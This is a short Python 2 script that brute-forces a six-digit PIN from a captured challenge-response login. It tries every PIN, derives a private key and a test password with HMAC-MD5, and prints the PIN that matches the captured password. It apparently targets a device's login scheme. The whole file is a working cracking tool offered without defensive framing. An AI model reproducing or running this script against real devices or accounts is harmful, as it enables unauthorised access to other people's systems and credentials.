import httplib
import xml.etree.ElementTree
import hmac
import md5
import time
import sys

if len(sys.argv) < 4:
	print "Usage: " + sys.argv[0] + " <public key> <challenge> <login password>"
	exit(1)

publickey = sys.argv[1]
challenge = sys.argv[2]
loginpassword = sys.argv[3]

count = 0
percentage = 0
print "CRACKING..."
for x in range(000000, 999999):
	pin = str(x).zfill(6)
	count = count + 1
	if count == 10000:
		count = 0
		percentage = percentage + 1
		print str(percentage) + "%"
	encdata = hmac.new(publickey + pin , challenge, md5)
	privatekey = encdata.hexdigest().upper()
	encdata = hmac.new(privatekey, challenge, md5)
	testpassword = encdata.hexdigest().upper()

	if(loginpassword == testpassword):
		print "FOUND PIN: " + pin
		#print "PRIVATE KEY: " + privatekey
		break





